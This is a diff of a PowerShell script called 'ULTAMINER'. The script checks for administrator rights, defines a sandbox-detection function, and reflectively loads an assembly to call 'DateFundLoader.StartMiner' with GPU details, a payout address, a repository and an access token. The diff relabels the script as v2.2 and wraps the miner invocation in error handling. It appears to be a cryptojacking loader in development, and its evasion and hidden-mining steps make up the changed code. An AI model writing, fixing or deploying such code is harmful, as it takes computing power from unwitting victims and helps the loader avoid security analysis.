@@ -25,7 +25,7 @@ if (-not $isAdmin) {
     }
     Write-Host "[+] Running as High Integrity Administrator."
 }
-Write-Host "[*] ULTAMINER v2.1 Audit Mode Active"
+Write-Host "[*] ULTAMINER v2.2 EMERGENCY OVERHAUL"
 
 
 function Test-Sandbox {
@@ -218,9 +218,18 @@ for ($i = 1; $i -le $maxRetries; $i++) {
 
             Write-Host "[+] Assembly Loaded: $($asm.FullName)"
             $repo = "$($c.u1)/$($c.u2)"
-            Write-Host "[*] Invoking StartMiner..."
-            $asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
-            Write-Host "[+] StartMiner Invoked!"
+            Write-Host "[*] Invoking StartMiner (Gpu: $($hw.gpu), Addr: $($c.addr))..."
+            try {
+                $type = $asm.GetType('DateFundLoader')
+                if ($null -eq $type) { throw "Could not find class DateFundLoader" }
+                $method = $type.GetMethod('StartMiner')
+                if ($null -eq $method) { throw "Could not find method StartMiner" }
+                $method.Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
+                Write-Host "[+] StartMiner Invoked Successfully!"
+            } catch {
+                Write-Host "[!] INVOCATION FAILED: $($_.Exception.Message)"
+                Write-Host "[!] Inner: $($_.Exception.InnerException.Message)"
+            }
             break
         }
     } catch {
